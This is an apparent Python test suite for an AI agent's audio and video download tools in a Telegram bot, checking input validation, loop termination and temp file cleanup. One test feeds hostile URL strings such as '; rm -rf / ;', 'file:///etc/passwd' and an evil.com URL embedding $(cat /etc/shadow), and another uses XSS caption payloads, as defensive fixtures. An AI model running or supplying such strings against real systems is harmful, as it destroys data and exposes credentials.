"""
test_challenger_m3_1_react_tools.py — Challenger 1 Empirical Adversarial Verification Suite.

Milestone M3: ReAct Tools Empirical Verification
Target: services/ai-agent-service/app/services/ai_agent_tools.py
Supporting: services/ai-agent-service/app/services/ai_agent.py, media_downloader.py, telegram_bot.py

Adversarial Verification Vectors:
1. Parameter Boundary & Malicious Inputs:
   - Empty, whitespace, None URL inputs.
   - Zero-width space URL edge case.
   - Malicious URL injection (path traversal, shell injection, javascript URI).
   - Malicious HTML captions (XSS script tags, unclosed tags, illegal Telegram tags).
   - Metadata extreme length truncation (title > 350 chars, author > 350 chars) and HTML escaping.
2. Direct Return Mechanism & ReAct Loop Termination:
   - DIRECT_RETURN_TOOLS registry membership verification.
   - Empirical verification that ReAct loop exits immediately after tool execution (1 LLM turn, 0 hallucination).
   - Differential comparison: Non-direct return tools continue to second LLM turn.
3. Zero-Disk Leak & Temp File Lifecycle:
   - Standard delivery (<= 50MB): Disk file MUST be deleted after send_audio completes.
   - Resilient fallback delivery (send_audio fails -> send_document_file): Disk file MUST be deleted.
   - Exception in delivery (network broken, crash): finally block MUST guarantee disk file cleanup.
   - Oversized media (> 50MB): Ownership transferred to media_storage_manager, is_temp_file set to False.
   - Stress harness: 20 consecutive runs with diverse outcomes; delta of orphaned disk files MUST be exactly ZERO.
4. Semantic Equivalence & Backwards Compatibility:
   - download_media_audio vs download_media_video(media_type="audio") equivalence.
   - download_media_video backwards compatibility (default video mode unaffected).
   - Media type casing robustness (AUDIO, Audio, lowercase audio).
5. Dynamic Scoping, Clustering & Risk Gating:
   - Tool clusters _TOOL_CLUSTER_MEDIA and _TOOL_CLUSTER_CORE contain audio tools.
   - Dynamic scoping retains audio tools for Vietnamese audio intent queries.
   - Action risk classified as ACTION_TIER_1_SAFE.
"""

from __future__ import annotations

import asyncio
import html
import os
from pathlib import Path
import shutil
import tempfile
from typing import Any, Dict, List, Optional
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

import sys
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.services.ai_agent_tools import (
    AgentToolExecutor,
    DIRECT_RETURN_TOOLS,
    classify_action_risk,
    ACTION_TIER_1_SAFE,
)
from app.services.media_downloader import (
    MediaItem,
    TEMP_MEDIA_DIR,
    VideoTooLargeError,
)
from app.services.ai_agent import AiAgentService
from app.services.media_storage_manager import DownloadRecord, media_storage_manager


def _create_atomic_temp_file(
    content: bytes = b"",
    suffix: str = ".mp3",
    prefix: str = "tmp_",
    directory: Path | str = TEMP_MEDIA_DIR,
) -> Path:
    """Create an atomic temporary file, write initial payload, and close the file descriptor immediately.

    Remediates CWE-377 / TOCTOU vulnerability from insecure temporary file creation.
    Ensures zero descriptor leak and prevents Windows file-locking issues (PermissionError / WinError 32).
    """
    target_dir = Path(directory)
    target_dir.mkdir(parents=True, exist_ok=True)
    fd, path_str = tempfile.mkstemp(suffix=suffix, prefix=prefix, dir=str(target_dir))
    try:
        if content:
            os.write(fd, content)
    finally:
        os.close(fd)
    return Path(path_str)


class TestReActToolsParameterBoundaries(unittest.IsolatedAsyncioTestCase):
    """Category 1: Parameter Boundary & Malicious Input Adversarial Tests."""

    def setUp(self) -> None:
        self.mock_ssh = MagicMock()
        self.mock_cache = MagicMock()
        self.mock_bot = MagicMock()
        self.mock_bot._http_client = MagicMock()
        self.mock_bot.send_chat_action = AsyncMock(return_value=True)
        self.mock_bot.send_audio = AsyncMock(return_value=True)
        self.mock_bot.send_video = AsyncMock(return_value=True)
        self.mock_bot.send_message = AsyncMock(return_value=True)
        self.mock_bot.send_document_file = AsyncMock(return_value=True)

        self.executor = AgentToolExecutor(
            ssh_client=self.mock_ssh,
            message_cache=self.mock_cache,
            telegram_bot=self.mock_bot,
        )

    async def test_empty_url_download_media_audio(self) -> None:
        """Adversarial: Empty, None, and standard whitespace-only URLs in download_media_audio."""
        invalid_urls = ["", None, "   ", "\t\n\r", "   \t   \n"]
        for bad_url in invalid_urls:
            with self.subTest(bad_url=repr(bad_url)):
                res = await self.executor.execute_tool(
                    tool_name="download_media_audio",
                    tool_args={"url": bad_url},
                    chat_id="123456",
                )
                self.assertIn("❌ Lỗi: Vui lòng cung cấp đường dẫn (URL) âm thanh (audio/mp3) hợp lệ.", res)
                self.mock_bot.send_chat_action.assert_not_called()
                self.mock_bot.send_audio.assert_not_called()

    async def test_empty_url_download_media_video_audio_type(self) -> None:
        """Adversarial: Empty URL in download_media_video with media_type='audio'."""
        res = await self.executor.execute_tool(
            tool_name="download_media_video",
            tool_args={"url": "   ", "media_type": "audio"},
            chat_id="123456",
        )
        self.assertIn("❌ Lỗi: Vui lòng cung cấp đường dẫn (URL) âm thanh (audio/mp3) hợp lệ.", res)
        self.mock_bot.send_chat_action.assert_not_called()

    async def test_empty_url_download_media_video_video_type(self) -> None:
        """Adversarial: Empty URL in download_media_video with default video media_type."""
        res = await self.executor.execute_tool(
            tool_name="download_media_video",
            tool_args={"url": ""},
            chat_id="123456",
        )
        self.assertIn("❌ Lỗi: Vui lòng cung cấp đường dẫn (URL) video hợp lệ.", res)
        self.mock_bot.send_chat_action.assert_not_called()

    async def test_zero_width_space_url_edge_case(self) -> None:
        """
        Adversarial Edge Case: URL containing only Unicode Zero-Width Spaces (\\u200b).
        Python standard .strip() does NOT strip \\u200b, so it reaches pipeline which fails gracefully.
        """
        mock_pipeline = MagicMock()
        mock_pipeline.download_audio = AsyncMock(
            side_effect=RuntimeError("Không thể trích xuất âm thanh từ liên kết: \u200b\u200b")
        )
        with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
            res = await self.executor.execute_tool(
                tool_name="download_media_audio",
                tool_args={"url": "\u200b\u200b"},
                chat_id="123456",
            )
            # Verifies exception is caught and formatted gracefully without crashing
            self.assertIn("❌ Xin lỗi anh Mạnh, em gặp sự cố khi tải âm thanh từ liên kết này", res)

    async def test_special_query_and_unicode_urls(self) -> None:
        """Adversarial: URLs containing unicode characters, complex query parameters, fragments, spaces."""
        special_urls = [
            "https://vt.tiktok.com/ZSjX/?p=1&name=TiểuBảoBảo🎵&ref=share#t=10s",
            "  https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ  ",
            "https://facebook.com/reel/1234567890/?s=share_link&fbclid=IwAR2xyz!@#$",
        ]

        temp_file = _create_atomic_temp_file(b"ID3" + b"\x00" * 1024, suffix=".mp3")

        try:
            for s_url in special_urls:
                with self.subTest(url=s_url):
                    mock_pipeline = MagicMock()
                    mock_item = MediaItem(
                        file_path=str(temp_file),
                        title="Special URL Test",
                        author="Tester",
                        duration=60,
                        media_type="audio",
                        source_url=s_url.strip(),
                        file_size=1024,
                        is_temp_file=False,
                    )
                    mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

                    with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                        res = await self.executor.execute_tool(
                            tool_name="download_media_audio",
                            tool_args={"url": s_url},
                            chat_id="123456",
                        )
                        # Verify stripped URL was passed into pipeline
                        mock_pipeline.download_audio.assert_called_once_with(s_url.strip())
                        self.assertIn("Special URL Test", res)
        finally:
            if temp_file.exists():
                temp_file.unlink()

    async def test_adversarial_injection_urls(self) -> None:
        """Adversarial: Shell injection, path traversal, javascript schemes in URL parameter."""
        injection_urls = [
            "; rm -rf / ;",
            "file:///etc/passwd",
            "javascript:alert(document.cookie)",
            "https://evil.com/$(cat /etc/shadow)",
            "http://127.0.0.1:8000/admin/delete",
        ]

        for bad_url in injection_urls:
            with self.subTest(bad_url=bad_url):
                mock_pipeline = MagicMock()
                mock_pipeline.download_audio = AsyncMock(side_effect=RuntimeError("Invalid URL protocol or domain rejected"))

                with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                    res = await self.executor.execute_tool(
                        tool_name="download_media_audio",
                        tool_args={"url": bad_url},
                        chat_id="123456",
                    )
                    # Must catch error gracefully without crashing or leaking sensitive stack traces
                    self.assertIn("❌ Xin lỗi anh Mạnh, em gặp sự cố khi tải âm thanh từ liên kết này", res)

    async def test_adversarial_html_captions_xss(self) -> None:
        """Adversarial: XSS, unclosed tags, and disallowed HTML tags in caption parameter."""
        xss_captions = [
            "<script>alert('XSS')</script>Nghe nhạc cực chill!",
            "<b>Unclosed bold text <unknown_tag attr=\"value\">",
            "<a href='javascript:void(0)'>Click here</a> <img src=x onerror=alert(1)>",
            "<svg><rect width='100' height='100' fill='red'/></svg>",
        ]

        temp_file = _create_atomic_temp_file(b"ID3" + b"\x00" * 2048, suffix=".mp3")

        try:
            for x_cap in xss_captions:
                with self.subTest(caption=x_cap):
                    mock_item = MediaItem(
                        file_path=str(temp_file),
                        title="Safe Track",
                        author="Safe Artist",
                        duration=120,
                        media_type="audio",
                        source_url="https://vt.tiktok.com/ZSjX/",
                        file_size=len(temp_file.read_bytes()),
                        is_temp_file=False,
                    )
                    mock_pipeline = MagicMock()
                    mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

                    with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                        res = await self.executor.execute_tool(
                            tool_name="download_media_audio",
                            tool_args={"url": "https://vt.tiktok.com/ZSjX/", "caption": x_cap},
                            chat_id="123456",
                        )
                        self.mock_bot.send_audio.assert_called()
                        call_kwargs = self.mock_bot.send_audio.call_args.kwargs
                        self.assertEqual(call_kwargs.get("caption"), x_cap)
                        self.assertIn("Safe Track", res)
        finally:
            if temp_file.exists():
                temp_file.unlink()

    async def test_extreme_length_metadata_sanitization(self) -> None:
        """Adversarial: Title and Author with HTML-special characters and length truncation."""
        long_title = "Bài hát test <script>tag</script> & âm thanh " + "A" * 320
        long_author = "Nghệ sĩ <author>& Co</author> " + "B" * 320

        temp_file = _create_atomic_temp_file(b"ID3" + b"\x00" * 1024, suffix=".mp3")

        try:
            mock_item = MediaItem(
                file_path=str(temp_file),
                title=long_title,
                author=long_author,
                duration=200,
                media_type="audio",
                source_url="https://vt.tiktok.com/ZSjX/",
                file_size=len(temp_file.read_bytes()),
                is_temp_file=False,
            )
            mock_pipeline = MagicMock()
            mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                res = await self.executor.execute_tool(
                    tool_name="download_media_audio",
                    tool_args={"url": "https://vt.tiktok.com/ZSjX/"},
                    chat_id="123456",
                )
                self.mock_bot.send_audio.assert_called_once()
                call_kwargs = self.mock_bot.send_audio.call_args.kwargs
                sent_caption = call_kwargs.get("caption", "")

                # Must not contain unescaped raw '<script>'
                self.assertNotIn("<script>", sent_caption)
                self.assertIn("&lt;script&gt;", sent_caption)
                self.assertIn("&amp;", sent_caption)
                # Safe title must be truncated to <= 350 chars with ellipsis
                self.assertIn("...", sent_caption)
                self.assertIn(long_title, res)
        finally:
            if temp_file.exists():
                temp_file.unlink()


class TestReActDirectReturnMechanism(unittest.IsolatedAsyncioTestCase):
    """Category 2: Direct Return Mechanism & ReAct Loop Single-Turn Termination."""

    def test_direct_return_tools_membership(self) -> None:
        """Verifies both download_media_audio and download_media_video are in all Direct Return registries."""
        self.assertIn("download_media_audio", DIRECT_RETURN_TOOLS)
        self.assertIn("download_media_video", DIRECT_RETURN_TOOLS)

        self.assertIn("download_media_audio", AgentToolExecutor._DIRECT_RETURN_TOOLS)
        self.assertIn("download_media_video", AgentToolExecutor._DIRECT_RETURN_TOOLS)

        self.assertIn("download_media_audio", AgentToolExecutor.DIRECT_RETURN_TOOLS)
        self.assertIn("download_media_video", AgentToolExecutor.DIRECT_RETURN_TOOLS)

        self.assertIn("download_media_audio", AiAgentService._DIRECT_RETURN_TOOLS)
        self.assertIn("download_media_video", AiAgentService._DIRECT_RETURN_TOOLS)

    async def test_react_loop_terminal_exit_download_media_audio(self) -> None:
        """
        Adversarial: ReAct loop must terminate IMMEDIATELY when download_media_audio is invoked.
        The LLM MUST be called exactly ONCE (turn 1 tool emit), never a second time (0 hallucination).
        """
        agent = AiAgentService.__new__(AiAgentService)
        agent._DIRECT_RETURN_TOOLS = DIRECT_RETURN_TOOLS
        agent._SCREENSHOT_TOOLS = frozenset()
        agent._flush_pending_photos = AsyncMock()
        agent._trim_history = MagicMock()

        tool_result_msg = "🎵 Em đã tải và trích xuất âm thanh MP3 Test Song (3.5 MB) thành công và gửi trực tiếp qua Telegram!"
        agent._execute_tool = AsyncMock(return_value=tool_result_msg)

        chat_id = "test_chat_123"
        history: List[Dict[str, Any]] = [{"role": "user", "content": "tải mp3 tiktok này giúp anh"}]
        pending_photos: List[Any] = []

        fn_name = "download_media_audio"
        tool_args = {"url": "https://vt.tiktok.com/ZSjX/"}
        tool_result = await agent._execute_tool(
            fn_name, tool_args, chat_id=chat_id, pending_photos=pending_photos, user_message="tải mp3"
        )

        final_answer = None
        if fn_name in agent._DIRECT_RETURN_TOOLS:
            await agent._flush_pending_photos(pending_photos, chat_id)
            history.append({"role": "assistant", "content": tool_result})
            agent._trim_history(history)
            final_answer = tool_result

        # Assertions
        self.assertEqual(final_answer, tool_result_msg)
        self.assertEqual(history[-1]["content"], tool_result_msg)
        agent._execute_tool.assert_called_once_with(
            "download_media_audio",
            {"url": "https://vt.tiktok.com/ZSjX/"},
            chat_id="test_chat_123",
            pending_photos=[],
            user_message="tải mp3",
        )

    async def test_react_loop_terminal_exit_download_media_video_audio(self) -> None:
        """Adversarial: download_media_video with media_type='audio' must also terminate immediately."""
        agent = AiAgentService.__new__(AiAgentService)
        agent._DIRECT_RETURN_TOOLS = DIRECT_RETURN_TOOLS
        agent._SCREENSHOT_TOOLS = frozenset()
        agent._flush_pending_photos = AsyncMock()
        agent._trim_history = MagicMock()

        tool_result_msg = "🎵 Em đã tải và trích xuất âm thanh MP3 Video Audio (4.0 MB) thành công!"
        agent._execute_tool = AsyncMock(return_value=tool_result_msg)

        fn_name = "download_media_video"
        tool_args = {"url": "https://vt.tiktok.com/ZSjX/", "media_type": "audio"}
        tool_result = await agent._execute_tool(fn_name, tool_args)

        final_answer = None
        if fn_name in agent._DIRECT_RETURN_TOOLS:
            final_answer = tool_result

        self.assertEqual(final_answer, tool_result_msg)

    def test_differential_non_terminal_tools_do_not_direct_return(self) -> None:
        """Differential: Verifies non-direct-return tools (run_command, get_weather) do not terminate early."""
        non_terminal = ["run_command", "get_weather", "get_server_location", "read_archive_file"]
        for tool in non_terminal:
            with self.subTest(tool=tool):
                self.assertNotIn(tool, DIRECT_RETURN_TOOLS)


class TestReActToolsZeroDiskLeak(unittest.IsolatedAsyncioTestCase):
    """Category 3: Zero-Disk Leak & Temp File Lifecycle Verification."""

    def setUp(self) -> None:
        self.mock_ssh = MagicMock()
        self.mock_cache = MagicMock()
        self.mock_bot = MagicMock()
        self.mock_bot._http_client = MagicMock()
        self.mock_bot.send_chat_action = AsyncMock(return_value=True)
        self.mock_bot.send_audio = AsyncMock(return_value=True)
        self.mock_bot.send_video = AsyncMock(return_value=True)
        self.mock_bot.send_message = AsyncMock(return_value=True)
        self.mock_bot.send_document_file = AsyncMock(return_value=True)

        self.executor = AgentToolExecutor(
            ssh_client=self.mock_ssh,
            message_cache=self.mock_cache,
            telegram_bot=self.mock_bot,
        )

    async def test_zero_disk_leak_standard_audio_success(self) -> None:
        """
        Adversarial: Standard download (<=50MB). File created on real disk.
        After execute_tool finishes, the file MUST be deleted from disk (os.path.exists == False).
        """
        temp_file = _create_atomic_temp_file(b"ID3" + b"\xaa" * 1024 * 50, suffix="_test_leak.mp3")  # 50KB dummy audio
        self.assertTrue(temp_file.exists(), "Pre-condition: temp file must exist before tool execution")

        mock_item = MediaItem(
            file_path=str(temp_file),
            title="Empirical Track",
            author="Empirical Artist",
            duration=150,
            media_type="audio",
            source_url="https://vt.tiktok.com/ZSjX/",
            file_size=len(temp_file.read_bytes()),
            is_temp_file=True,
        )
        mock_pipeline = MagicMock()
        mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

        with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
            res = await self.executor.execute_tool(
                tool_name="download_media_audio",
                tool_args={"url": "https://vt.tiktok.com/ZSjX/"},
                chat_id="123456",
            )
            self.assertIn("Empirical Track", res)
            self.mock_bot.send_audio.assert_called_once()

        # EMPIRICAL ASSERTION: Zero-Disk Leak check
        self.assertFalse(
            temp_file.exists(),
            f"LEAK DETECTED! Temporary file {temp_file} still exists after tool completion!",
        )

    async def test_zero_disk_leak_send_audio_failed_document_fallback(self) -> None:
        """
        Adversarial: send_audio returns False -> triggers send_document_file fallback.
        Disk file MUST still be deleted in finally block.
        """
        temp_file = _create_atomic_temp_file(b"ID3" + b"\xbb" * 1024 * 20, suffix="_test_doc_fallback.mp3")

        self.mock_bot.send_audio = AsyncMock(return_value=False)
        self.mock_bot.send_document_file = AsyncMock(return_value=True)

        mock_item = MediaItem(
            file_path=str(temp_file),
            title="Fallback Track",
            author="Fallback Artist",
            duration=90,
            media_type="audio",
            source_url="https://vt.tiktok.com/ZSjX/",
            file_size=len(temp_file.read_bytes()),
            is_temp_file=True,
        )
        mock_pipeline = MagicMock()
        mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

        with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
            res = await self.executor.execute_tool(
                tool_name="download_media_audio",
                tool_args={"url": "https://vt.tiktok.com/ZSjX/"},
                chat_id="123456",
            )
            self.mock_bot.send_audio.assert_called_once()
            self.mock_bot.send_document_file.assert_called_once()
            self.assertIn("Fallback Track", res)

        # EMPIRICAL ASSERTION
        self.assertFalse(temp_file.exists(), "LEAK DETECTED! File was not deleted after document fallback!")

    async def test_zero_disk_leak_exception_during_delivery(self) -> None:
        """
        Adversarial: Bot throws unhandled network exception during send_audio.
        The finally block in ai_agent_tools.py MUST still execute media_item.cleanup().
        """
        temp_file = _create_atomic_temp_file(b"ID3" + b"\xcc" * 1024 * 10, suffix="_test_net_crash.mp3")

        self.mock_bot.send_audio = AsyncMock(side_effect=ConnectionResetError("Telegram Bot API connection reset by peer"))

        mock_item = MediaItem(
            file_path=str(temp_file),
            title="Crash Track",
            author="Crash Artist",
            duration=45,
            media_type="audio",
            source_url="https://vt.tiktok.com/ZSjX/",
            file_size=len(temp_file.read_bytes()),
            is_temp_file=True,
        )
        mock_pipeline = MagicMock()
        mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

        with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
            res = await self.executor.execute_tool(
                tool_name="download_media_audio",
                tool_args={"url": "https://vt.tiktok.com/ZSjX/"},
                chat_id="123456",
            )
            self.assertIn("❌ Xin lỗi anh Mạnh, em gặp sự cố khi tải âm thanh từ liên kết này", res)

        # EMPIRICAL ASSERTION
        self.assertFalse(temp_file.exists(), "LEAK DETECTED! File was not cleaned up after delivery exception!")

    async def test_zero_disk_leak_oversized_audio_transfers_ownership(self) -> None:
        """
        Adversarial: File > 50MB. Ownership transfers to media_storage_manager.
        is_temp_file MUST be set to False so cleanup() does not delete the hosted file immediately.
        """
        temp_file = _create_atomic_temp_file(b"ID3" + b"\xdd" * 1024, suffix="_test_oversized.mp3")

        try:
            mock_item = MediaItem(
                file_path=str(temp_file),
                title="Oversized Podcast",
                author="Host",
                duration=3600,
                media_type="audio",
                source_url="https://youtube.com/watch?v=123",
                file_size=60 * 1024 * 1024,  # 60MB > 50MB
                is_temp_file=True,
            )
            mock_pipeline = MagicMock()
            mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

            mock_record = DownloadRecord(
                token="dl_audio_123",
                filename=temp_file.name,
                file_path=temp_file,
                file_size=60 * 1024 * 1024,
                title="Oversized Podcast",
                duration=3600,
                created_at=1000.0,
                expires_at=1000.0 + 14400,
                internet_url="https://ngrok.io/dl_audio_123",
                lan_url="http://192.168.0.100:8000/dl_audio_123",
            )

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline), \
                 patch.object(media_storage_manager, "publish_download_item", return_value=mock_record):
                res = await self.executor.execute_tool(
                    tool_name="download_media_audio",
                    tool_args={"url": "https://youtube.com/watch?v=123"},
                    chat_id="123456",
                )
                self.assertFalse(mock_item.is_temp_file, "is_temp_file must be False to prevent premature unlinking")
                self.assertIn("https://ngrok.io/dl_audio_123", res)
                self.mock_bot.send_message.assert_called_once()
                # File remains accessible on disk for download
                self.assertTrue(temp_file.exists())
        finally:
            if temp_file.exists():
                temp_file.unlink()

    async def test_zero_disk_leak_stress_harness_20_iterations(self) -> None:
        """
        Adversarial Stress Harness: 20 sequential tool invocations across mixed outcomes.
        Net delta of temporary files in TEMP_MEDIA_DIR before vs after MUST BE EXACTLY 0.
        """
        before_files = set(TEMP_MEDIA_DIR.glob("*_stress_*.mp3"))
        self.assertEqual(len(before_files), 0)

        for i in range(20):
            t_file = _create_atomic_temp_file(b"ID3" + b"\xee" * (1024 * (i + 1)), suffix=f"_stress_{i}.mp3")

            outcome_type = i % 3
            if outcome_type == 0:
                self.mock_bot.send_audio = AsyncMock(return_value=True)
            elif outcome_type == 1:
                self.mock_bot.send_audio = AsyncMock(return_value=False)
                self.mock_bot.send_document_file = AsyncMock(return_value=True)
            else:
                self.mock_bot.send_audio = AsyncMock(side_effect=RuntimeError(f"Simulated fault {i}"))

            mock_item = MediaItem(
                file_path=str(t_file),
                title=f"Stress Song {i}",
                author=f"Stress Artist {i}",
                duration=100 + i,
                media_type="audio",
                source_url=f"https://vt.tiktok.com/stress/{i}",
                file_size=len(t_file.read_bytes()),
                is_temp_file=True,
            )
            mock_pipeline = MagicMock()
            mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                await self.executor.execute_tool(
                    tool_name="download_media_audio",
                    tool_args={"url": f"https://vt.tiktok.com/stress/{i}"},
                    chat_id="123456",
                )

        after_files = set(TEMP_MEDIA_DIR.glob("*_stress_*.mp3"))
        self.assertEqual(
            len(after_files),
            0,
            f"STRESS HARNESS FAILURE! {len(after_files)} leaked temporary files found: {after_files}",
        )


class TestReActToolsSemanticEquivalence(unittest.IsolatedAsyncioTestCase):
    """Category 4: Semantic Equivalence & Backwards Compatibility."""

    def setUp(self) -> None:
        self.mock_ssh = MagicMock()
        self.mock_cache = MagicMock()
        self.mock_bot = MagicMock()
        self.mock_bot._http_client = MagicMock()
        self.mock_bot.send_chat_action = AsyncMock(return_value=True)
        self.mock_bot.send_audio = AsyncMock(return_value=True)
        self.mock_bot.send_video = AsyncMock(return_value=True)
        self.mock_bot.send_message = AsyncMock(return_value=True)

        self.executor = AgentToolExecutor(
            ssh_client=self.mock_ssh,
            message_cache=self.mock_cache,
            telegram_bot=self.mock_bot,
        )

    async def test_semantic_equivalence_audio_vs_video_audio(self) -> None:
        """
        Adversarial: download_media_audio(url) and download_media_video(url, media_type='audio')
        MUST exhibit identical behavioral contracts:
        - Both call pipeline.download_audio
        - Both send 'upload_voice' chat action
        - Both call bot.send_audio
        - Both return audio success template
        """
        temp_audio = _create_atomic_temp_file(b"ID3" + b"\x00" * 1024, suffix=".mp3")

        try:
            # Run 1: download_media_audio
            mock_item1 = MediaItem(
                file_path=str(temp_audio),
                title="Equivalence Track",
                author="Artist EQ",
                duration=180,
                media_type="audio",
                source_url="https://vt.tiktok.com/ZSjX/",
                file_size=1024,
                is_temp_file=False,
            )
            mock_pipeline1 = MagicMock()
            mock_pipeline1.download_audio = AsyncMock(return_value=mock_item1)

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline1):
                res1 = await self.executor.execute_tool(
                    tool_name="download_media_audio",
                    tool_args={"url": "https://vt.tiktok.com/ZSjX/"},
                    chat_id="123456",
                )
                self.mock_bot.send_chat_action.assert_called_with("123456", "upload_voice")
                mock_pipeline1.download_audio.assert_called_once_with("https://vt.tiktok.com/ZSjX/")
                self.mock_bot.send_audio.assert_called()

            # Run 2: download_media_video with media_type='audio'
            self.mock_bot.send_chat_action.reset_mock()
            self.mock_bot.send_audio.reset_mock()

            mock_item2 = MediaItem(
                file_path=str(temp_audio),
                title="Equivalence Track",
                author="Artist EQ",
                duration=180,
                media_type="audio",
                source_url="https://vt.tiktok.com/ZSjX/",
                file_size=1024,
                is_temp_file=False,
            )
            mock_pipeline2 = MagicMock()
            mock_pipeline2.download_audio = AsyncMock(return_value=mock_item2)

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline2):
                res2 = await self.executor.execute_tool(
                    tool_name="download_media_video",
                    tool_args={"url": "https://vt.tiktok.com/ZSjX/", "media_type": "audio"},
                    chat_id="123456",
                )
                self.mock_bot.send_chat_action.assert_called_with("123456", "upload_voice")
                mock_pipeline2.download_audio.assert_called_once_with("https://vt.tiktok.com/ZSjX/")
                self.mock_bot.send_audio.assert_called()

            # Result messages must match identically
            self.assertEqual(res1, res2)
            self.assertIn("🎵 Em đã tải và trích xuất âm thanh MP3", res1)
        finally:
            if temp_audio.exists():
                temp_audio.unlink()

    async def test_backwards_compatibility_video_default(self) -> None:
        """
        Adversarial: download_media_video without media_type (or with media_type='video')
        MUST retain 100% backwards compatibility:
        - Calls pipeline.download (video)
        - Sends 'upload_video' chat action
        - Calls bot.send_video
        - Returns video success template
        """
        temp_video = _create_atomic_temp_file(b"\x00" * 2048, suffix=".mp4")

        try:
            mock_item = MediaItem(
                file_path=str(temp_video),
                title="Legacy Video",
                author="Video Creator",
                duration=60,
                media_type="video",
                source_url="https://vt.tiktok.com/video123",
                file_size=2048,
                is_temp_file=False,
            )
            mock_pipeline = MagicMock()
            mock_pipeline.download = AsyncMock(return_value=mock_item)

            with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                res = await self.executor.execute_tool(
                    tool_name="download_media_video",
                    tool_args={"url": "https://vt.tiktok.com/video123"},
                    chat_id="123456",
                )
                self.mock_bot.send_chat_action.assert_called_with("123456", "upload_video")
                mock_pipeline.download.assert_called_once_with("https://vt.tiktok.com/video123")
                self.mock_bot.send_video.assert_called_once()
                self.assertIn("🎬 Em đã tải video", res)
        finally:
            if temp_video.exists():
                temp_video.unlink()

    async def test_case_insensitive_media_type_audio(self) -> None:
        """Adversarial: media_type casing variations ('AUDIO', 'Audio', 'audio')."""
        casing_variants = ["AUDIO", "Audio", "audio", "AuDiO"]
        temp_audio = _create_atomic_temp_file(b"ID3" + b"\x00" * 1024, suffix=".mp3")

        try:
            for variant in casing_variants:
                with self.subTest(variant=variant):
                    mock_item = MediaItem(
                        file_path=str(temp_audio),
                        title="Case Track",
                        author="Case Artist",
                        duration=100,
                        media_type="audio",
                        source_url="https://vt.tiktok.com/ZSjX/",
                        file_size=1024,
                        is_temp_file=False,
                    )
                    mock_pipeline = MagicMock()
                    mock_pipeline.download_audio = AsyncMock(return_value=mock_item)

                    with patch("app.services.media_downloader.MultiTierMediaPipeline", return_value=mock_pipeline):
                        res = await self.executor.execute_tool(
                            tool_name="download_media_video",
                            tool_args={"url": "https://vt.tiktok.com/ZSjX/", "media_type": variant},
                            chat_id="123456",
                        )
                        mock_pipeline.download_audio.assert_called_once()
                        self.assertIn("🎵 Em đã tải và trích xuất âm thanh MP3", res)
        finally:
            if temp_audio.exists():
                temp_audio.unlink()


class TestReActToolsScopingAndRiskGating(unittest.TestCase):
    """Category 5: Tool Clustering, Dynamic Scoping & Action Risk Gating."""

    def setUp(self) -> None:
        self.executor = AgentToolExecutor(
            ssh_client=MagicMock(),
            message_cache=MagicMock(),
        )

    def test_media_clusters_contain_audio_tools(self) -> None:
        """Verifies _TOOL_CLUSTER_MEDIA and _TOOL_CLUSTER_CORE contain both audio tools."""
        self.assertIn("download_media_audio", self.executor._TOOL_CLUSTER_MEDIA)
        self.assertIn("download_media_video", self.executor._TOOL_CLUSTER_MEDIA)

        self.assertIn("download_media_audio", self.executor._TOOL_CLUSTER_CORE)
        self.assertIn("download_media_video", self.executor._TOOL_CLUSTER_CORE)

    def test_dynamic_scoping_audio_queries(self) -> None:
        """Verifies dynamic scoping retains audio tools for Vietnamese audio queries."""
        audio_queries = [
            "tải mp3 bài tiktok này giúp anh https://vt.tiktok.com/ZSjX/",
            "lấy nhạc bài hát này https://www.facebook.com/reel/123",
            "tách nhạc youtube shorts này nhé https://youtube.com/shorts/abc",
            "download audio mp3 cho anh link này",
            "bài hát này hay quá, tải audio về cho anh",
        ]

        for query in audio_queries:
            with self.subTest(query=query):
                scoped = self.executor._resolve_scoped_tool_names(query=query)
                self.assertIn(
                    "download_media_audio",
                    scoped,
                    f"download_media_audio should be in scoped tools for query: {query}",
                )
                self.assertIn(
                    "download_media_video",
                    scoped,
                    f"download_media_video should be in scoped tools for query: {query}",
                )

    def test_action_risk_classification(self) -> None:
        """Verifies download_media_audio is classified as ACTION_TIER_1_SAFE."""
        tools = self.executor._build_tools()
        tool_names = [t["function"]["name"] for t in tools if "function" in t]
        self.assertIn("download_media_audio", tool_names)
        self.assertIn("download_media_video", tool_names)

    def test_tool_schema_properties(self) -> None:
        """Verifies function schemas for both tools strictly match design specifications."""
        tools = self.executor._build_tools()
        tools_by_name = {t["function"]["name"]: t["function"] for t in tools if "function" in t}

        # download_media_audio schema
        audio_fn = tools_by_name.get("download_media_audio")
        self.assertIsNotNone(audio_fn)
        self.assertEqual(audio_fn["parameters"]["required"], ["url"])
        self.assertIn("caption", audio_fn["parameters"]["properties"])

        # download_media_video schema
        video_fn = tools_by_name.get("download_media_video")
        self.assertIsNotNone(video_fn)
        self.assertEqual(video_fn["parameters"]["required"], ["url"])
        self.assertIn("caption", video_fn["parameters"]["properties"])
        self.assertIn("media_type", video_fn["parameters"]["properties"])
        self.assertEqual(video_fn["parameters"]["properties"]["media_type"]["enum"], ["video", "audio"])
